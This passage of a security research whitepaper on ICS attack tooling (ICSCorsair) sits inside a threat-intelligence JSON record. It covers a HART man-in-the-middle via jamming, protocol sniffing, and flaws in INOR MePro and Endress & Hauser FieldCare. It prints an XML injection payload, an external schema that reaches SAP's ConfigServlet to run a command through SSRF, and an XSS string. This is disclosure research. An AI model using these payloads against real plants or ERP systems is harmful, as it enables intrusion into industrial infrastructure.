that the HART FSK baud rate is 1200 bps and the parity is **Odd.**\nHowever, due to the half-duplex nature of HART FSK networks, you can’t simply spoof HART messages. If\nyou try to spoof a field device response, even if you send your response to the master faster than the\nfield device, both responses will start travelling on the loop with a very small time delta, and a collision\nwill occur. Obviously, you can become another master on the network and try to reconfigure field\ndevices. This allows us to perform a MitM attack on HART field devices. The following steps demonstrate\nhow to use the protocol features to do it.\n\nOn the first step, attacker connects to the HART network and listens to packets on it:\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nAfter determining the field device’s Unique and Polling IDs, the attacker starts to fuzz the line by sending\nmany ‘0’ or ‘1’ into it:\n\nWhen the network is jammed, field devices’ replies do not reach the master, and fault state will occur.\nMost HART masters in such case will pause their operations for a small period of time (master goes to\nsleep). This time should be enough to allow the attacker to change the Polling ID of the attacked field\ndevice. Yes, there is a standard HART protocol command (6) that allows doing it:\n\nAfter sleep time ends, the master wakes up and starts re-scanning the network using field device IDs.\nBut our field device now has a different Polling ID, and the attacker can reply to the master easily.\nMission accomplished:\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nThis process is automated with the ‘hart_mitm.rb’ script available in the software/ruby folder of the\nICSCorsair repository. Moreover, the MitM feature can be activated in most ICSCorsair MetaSploit\nmodules by setting the ‘MITM’ parameter to ‘Yes’ and configuring ‘MITM_UniqueID’ and\n‘MITM_NewPollingID’ parameters. Check the ‘info’ of the MetaSploit module to determine whether the\nMitM feature is supported by the selected attack.\n\n### 5.2 Modbus protocol (over RS-485)\n\nModbus is a serial communication protocol which was originally developed in the end of the 1970s for\nuse with PLCs. Due to its simplicity, Modbus has currently become a widespread standard for\ncommunication between industrial devices. Modbus allows communication for up to 240 devices\nconnected to the same network. Currently, many physical layers support Modbus, such as RS-485,\nModbus over TCP, even SMS and Mesh networks. As many old protocols, Modbus doesn’t originally\nsupport any authentication, authorization, or cryptography methods.\n\nICSCorsair support Modbus over RS-485, so let’s take a quick look onto its physical and datalink layers.\nRS-485 (TIA-485-A) is a standard defining the electrical characteristics of drivers and receivers for use in\nbalanced digital multipoint systems. Digital communications networks where the RS-485 standard is\nimplemented can be used effectively over long distances and in electrically noisy environments. Multiple\nreceivers may be connected to such a network in a linear, multi-drop configuration[11].\n\nA typical RS-485 line consists of a differential balanced line over twisted pair. This provides significant\nspeed: up to 35 Mbps in a 10 m line, and up to 100 Kbps in 1200 m (maximum line length). The most\nused (and recommended) architecture of RS-485 network is point-to-point or bus. The terminator\nresistor (typically, with 120 Ohm value) should be present on both ends of the bus. Differential line work\n\n11 [http://en.wikipedia.org/wiki/RS-485](http://en.wikipedia.org/wiki/RS-485)\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nprinciple (when sending the ‘0xD3’ character over the line) is shown on fig. 12. RS-485 line consists of\ntwo wires: B(U-), inverting or Tx-/Rx- wire and A(U+), non-inverting or Tx+/Rx+ wire.\n\n**Figure 12: RS-485 waveform example[12]**\n\nICSCorsair supports working with Modbus line as a common RS-485 modem. Refer to the ICSCorsair\ncommand reference (see table 1) for more information on configuring ICSCorsair to work with Modbus.\nAlso, the Ruby script ‘modbus_sniff.rb’ and a MetaSploit module exist to provide sniffing Modbus over\nRS-485 line and basic parsing of its packets.\n\n### 5.3 Profibus DP protocol\n\nProfibus is a standard for fieldbus communication that is mainly supported by Siemens. There are\nseveral different physical layers of Profibus: DP (over RS-485 or optical line) and PA (using twisted pair\nand MBP). DP and PA lines can be connected together using a coupler device. The Profibus datalink layer\nis called FDL (Fieldbus Data Link) and works as a hybrid access method using token and master-slave\nscheme.\n\nProfibus PA works using MBP (Manchester Bus Powered) transmission technology with a maximum\nspeed of 31.25 Kbps. Profibus DP can work over optical lines and RS-485 networks. The maximum speed\nof Profibus DM can reach 12 Mbps, and the minimum allowed speed is 9600 bps.\n\nCurrently, ICSCorsair only supports sniffing Profibus DP (over RS-485) networks with a maximum speed\nof up to 1 Mbps (when CY8C38* MCU is used). You can sniff Profibus line with the ‘profibusdp_sniff.rb’\nhelper script.\n\n# 6. Triggering ICS software bugs using ICSCorsair (examples)\n\n### 6.1. Denial of Service in INOR MePro\n\n[12 Picture from http://en.wikipedia.org/wiki/RS-485#mediaviewer/File:RS-485_waveform.svg, see copyright and](http://en.wikipedia.org/wiki/RS-485#mediaviewer/File:RS-485_waveform.svg)\nlicense terms there.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nINOR MePro system is a software for configuring and monitoring some INOR temperature and pressure\ntransmitters. We can use ICSCorsair to trigger Denial of Service there. The MePro software doesn’t\nhandle the upper margin of HART packet correctly, so if we construct a HART reply by putting ‘0’ into the\nlength field and adding random garbage to extend the packet length to be more than 250 bytes, we will\ntrigger a DoS (see fig. 13):\n\n**Figure 13: INOR MePro Denial of Service using ICSCorsair**\n\nMetaSploit module for triggering DoS in MePro through MitM of legacy field device is provided on the\nICSCorsair repository.\n\n### 6.2. SSRF in FieldCare system\n\nTo talk about the next two vulnerabilities, we need to review some information about Plant Asset\nManagement systems (PAS). There are a lot of field devices on big industrial objects. It would be very\npainful to manage them in the ordinary way. The solution is Plant Asset Management Systems, which\nallow engineers to configure and monitor all field devices, and managers to review the full state of the\nfield device infrastructure. Most PAS software is based on FDT/DTM (Field Device Type/Device Type\nManager).\n\nFDT standardizes the communication and configuration interface between all field devices and host\nsystems. DTM provides a unified structure for accessing device parameters, configuring and operating\nthe devices, and diagnosing problems[13]. FDT provides an environment for accessing field devices and\n\n[13 See http://www.fdtgroup.org/.](http://www.fdtgroup.org/)\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\ntheir features. Field devices could be configured, monitored, maintained from one software system,\nwithout paying attention to the specific model, type, or industrial protocol of a field device. FDT frame\napplication allows engineers to load and create hierarchies of DTM device drivers and UIs. There are two\ntypes of DTM:\n\n    - CommDTMs, which allow operating specific industrial protocols;\n\n    - DeviceDTMs, which provide the functionality to work with specific field devices.\n\nFDT 1.2.1 technology is based on the interoperation of COM components. FDT frame application and\nvarious DTMs are exchanging XML messages with each other. This model is shown on the fig. 14:\n\n**Figure 14: FDT/DTM architecture[14]**\n\nOne of the most popular FDT Frame applications is Endress & Hauser FieldCare. It provides multiple\nfeatures, including integration with MES and ERP, binding to databases, data exchange with external\napplications, and the Condition Monitoring component which allows monitoring field device\ninfrastructure using a web browser. On figure 15, you can see the main window interface of FieldCare:\n\n[14 Figure can be found in FDT group official specification, see http://www.fdtgroup.org/technical-documents.](http://www.fdtgroup.org/technical-documents)\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n**Figure 15: E&H FieldCare main window with several DTM components hierarchy**\n\nXML is very convenient for an attacker. Remember that we have two application layer identifiers in\nHART protocol – tag and long tag. While tag is in packed ASCII format and very short, long tag is a very\ngood starting point for finding XML injections. The HART command 20 requests tag from field devices. If\nwe simulate the field device with ICSCorsair and send long tag with some XML special symbols (<&’”) to\nFieldCare, we will see something interesting:\n\n**Figure 16: FieldCare XML special symbols escaping fail.**\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nWe can find, by experimenting, that the error itself is triggered by < and ‘ symbols. During the debug and\nprofile process, we have been able (with the really BIG help of Svetlana Cherkasova) to extract the XML\ndocument where the error is triggered:\n```\n<?xml version='1.0'?><FMP xmlns:devinfo='xschema:FMPDeviceInformationSchema.xml'>  <devinfo:DeviceInformation\ndataSource='device' busCategory='036D1498-387B-11D4-86E1-00E0987270B9'\nbusCategoryName='HART' busAddress='0' tag=\"<’\" serialNumber='1110044'\nhardwareRevision='10' softwareRevision='25' commandRevision='10'\nprofileRevision='6' genericRevision='0'>    <devinfo:Device name=\"\"\nid='41' subId=''/>    <devinfo:ENP enpSoftwareVersion=''\nenpSerialNumber='' enpOrderCode='' enpTag='<’'/><devinfo:Manufacturer\nname=\"Honeywell\" id='23'/>  </devinfo:DeviceInformation></FMP>\n\n```\nThe simple XML injection is taking place here. Unfortunately, we cannot reach the beginning of the\ndocument, so we cannot trigger an XML eXternal Entity attack. But we can forge an XSD request here,\nwhich means that we can do an SSRF (Server-Side Request Forgery) attack. There are more good news:\nbesides the maximum 32 bytes long tag length, FieldCare has a bug in the HART protocol parser, and it\nwill parse a command 20 response till the end of the maximum HART packet length (255). Thus, we can\nuse a very long long tag :) Here, the following injection allows us to include an external x-scheme:\n```\nA' xmlns:device='x-schema:http://domainname:port/file.xsd\n\n```\nHere, we are loading the external XML schema from some web server. In the ‘file.xsd’, we are free from\nthe limits on symbols and injection length, so we could use SSRF with much greater efficiency. PAS\nsystems often reside on the upper level of ICS infrastructures, and FieldCare is often integrated with ERP\nsystems, e. g. SAP. If you know an SAP IP address and it’s unpatched, we can use the infamous SAP\nremote command execution bug (found in 2012 by Dmitry Chastukhin of ERPScan). For example, the\nfollowing contents of ‘file.xsd’ will run calc.exe on the target SAP:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<Schema name=\"Device\" xmlns=\"urn:schemas-microsoft-com:xml-data\"\nxmlns:dt=\"urn:schemas-microsoft-com:datatypes\"\nxmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<AttributeType name=\"name\" dt:type=\"string\"\nxmlns:xi=\"http://www.w3.org/2001/XInclude\"><include xmlns=\"xschema:http://SAPSERVERDOMAINORIP:50100/ctc/servlet/ConfigServlet?param=com.s\nap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=calc\"/></AttributeType>\n</Schema>\n\n```\n**Mission accomplished – we pwned the ERP system through 4-20 mA current loop! Let’s repeat the**\nattack scheme from the beginning (see fig. 17). Before starting the attack, the attacker sniffs the loop\nand determines the field device monitored by the PAS system.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n**Figure 17: Attacking SAP through current loop**\n\nOn step 1, he sends the HART command 22 (long tag change packet) to the target field device and\nchange its tag to `A' xmlns:device='x-schema:http://domainname. Additionally, he sets up a`\nweb server on the chosen domainname and uploads a file there with a specially crafted XML schema\n(see above). On step 2, FieldCare queries the field device through the HART gateway or directly through\nthe modem; the XML data is injected into the internal XML documents of the FDT Frame application\n(step 3). FieldCare asks the evil web server for the external scheme (step 4), receives it (step 5), and an\nexploit query to SAP is triggered by SSRF (step 6). Now the attacker has successfully run calc.exe through\n4-20 mA current loop. An SSRF attack here may lead to other not-very-good consequences, such as XML\nparser denial-of-service or an NTLM relay attack.\n\nYou can change the HART field device long tag using a special script ‘hart_change_longtag.rb’ or a\nspecial MetaSploit module. Both files can be found in the accompanying ICSCorsair software.\n\n### 6.3. XSS in FieldCare Condition monitoring\n\nFieldCare comes with a Condition Monitoring (CM) system which allows monitoring field device state\nand exporting this information to other databases or applications. Also, FieldCare CM includes a web\nserver, so engineers and operators can view the information about their field device network using only\na web browser. Unfortunately, there are no input filters on long tag parameter in CM. If we use the\nsame technique as in the previous chapter to change the long tag of the field device to something like:\n```\nA\" onLoad=\"alert(111)\" onA=\"\n\n```\n– this will trigger an XSS in CM, as shown on fig. 18:\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n**Figure 18: XSS in FieldCare CM**\n\nNow we have XSS through current loop, and this is another funny proof of the weaknesses of deep\nintegration of ICS layers.\n\n# 7. Conclusions and future work\n\nCurrently, ICSCorsair provides tools and abilities for attacking HART and Modbus industrial protocols.\nUsing deep integration of modern ICS infrastructures, you can reach the upper levels of a network and\neven attack the corporate network servers using only the opportunity of connection to the current loop\nor the RS-485 line. The results of this research show how fragile modern ICS infrastructures can be. The\nfuture development of ICSCorsair will include solving some of the following tasks:\n\n  - Support for high-speed Profibus-DP network (up to 12 Mbps);\n\n  - High-speed USB;\n\n  - Support for Profibus-PA, Foundation Fieldbus H1 and HART C8PSK protocols;\n\n  - More tools, helper scripts, and features of the mobile application.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n# 8. Thanksgiving service\n\nThis research wouldn’t be possible without the help of many people and companies, and we want to\nmention them. Thanks to:\n\n     - **Svetlana Cherkasova for “some binary magic” in reversing FieldCare and DTMs code,**\nwhich allowed us to develop an SSRF attack through HART network;\n\n     - **ppram-5 for helping in ICSCorsair circuit and PCB design;**\n\n     - **Alexander Malinovskiy aka Weedle for help on the HART protocol research, developing**\nthe HRTShield PCB, and creating the first version of ICSCorsair prototype (which you saw\non fig. 6);\n\n     - **Alexander Peslyak (@solardiz) for many bright ideas;**\n\n     - **ERPScan company for help and support;**\n\n     - **Dmitry Chastukhin (@_chipik)** for the marvelous remote command execution in SAP,\nwhich allowed us to show how SSRF can be really dangerous in case of FieldCare;\n\n     - **Konstantin Karpov aka QweR for help with getting, buying, and delivering field devices;**\n\n     - **Fedor Savelyev aka Alouette for help with Digital Signal Processing;**\n\n     - **Grigoriy Savelyev for help with selecting and graduating op amps;**\n\n     - **Alexander Polyakov & Vladimir Vorontsov for great papers and presentations on SSRF**\nattacks;\n\n     - **Guys from electronics.stackexchange.net for answering many stupid questions;**\n\n     - **Cypress Semiconductors and Maxim Integrated for great ICs and technical support.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.blackhat.com/docs/us-14/materials/us-14-Bolshev-ICSCorsair-How-I-Will-PWN-Your-ERP-Through-4-20mA-Current-Loop-WP.pdf"
    ],
    "report_names": [
        "us-14-Bolshev-ICSCorsair-How-I-Will-PWN-Your-ERP-Through-4-20mA-Current-Loop-WP.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041139,
    "ts_creation_date": 1404157661,
    "ts_modification_date": 1404157661,
    "files": {
        "pdf": "https://archive.orkl.eu/3b57e8833c6eb42bbf90f1d39cf6c3a5927ada34.pdf",
        "text": "https://archive.orkl.eu/3b57e8833c6eb42bbf90f1d39cf6c3a5927ada34.txt",
        "img": "https://archive.orkl.eu/3b57e8833c6eb42bbf90f1d39cf6c3a5927ada34.jpg"
    }
}